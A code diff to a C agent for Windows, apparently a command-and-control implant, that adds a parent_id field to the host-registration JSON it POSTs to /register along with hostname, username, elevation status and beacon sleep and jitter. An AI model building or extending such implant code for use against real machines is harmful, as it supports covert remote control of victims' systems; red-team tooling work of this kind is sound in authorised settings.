@@ -436,10 +436,10 @@ int agent_register(void) {
     snprintf(body, sizeof(body),
         "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
         "\"pid\":%lu,\"transport\":\"%s\","
-        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\",\"is_admin\":%s,\"language\":\"c\"}",
+        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\",\"is_admin\":%s,\"parent_id\":\"%s\",\"language\":\"c\"}",
         hostname, username_j, (unsigned long)GetCurrentProcessId(),
         AGENT_TRANSPORT, AGENT_SLEEP_SEC, AGENT_JITTER_PCT, exe_name,
-        is_elevated() ? "true" : "false");
+        is_elevated() ? "true" : "false", AGENT_PARENT_ID);
 
     uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
     if (!http_do("POST", "/register",
@@ -742,10 +742,10 @@ int agent_http_register(void) {
     snprintf(body, sizeof(body),
         "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
         "\"pid\":%lu,\"transport\":\"%s\","
-        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\",\"is_admin\":%s,\"language\":\"c\"}",
+        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\",\"is_admin\":%s,\"parent_id\":\"%s\",\"language\":\"c\"}",
         hostname, username_j2, (unsigned long)GetCurrentProcessId(),
         AGENT_TRANSPORT, AGENT_SLEEP_SEC, AGENT_JITTER_PCT, exe_name,
-        is_elevated() ? "true" : "false");
+        is_elevated() ? "true" : "false", AGENT_PARENT_ID);
     uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
     if (!http_do("POST", "/register", (const uint8_t*)body, strlen(body),
                  &resp, &resp_len, &status) || status != 200 || !resp)
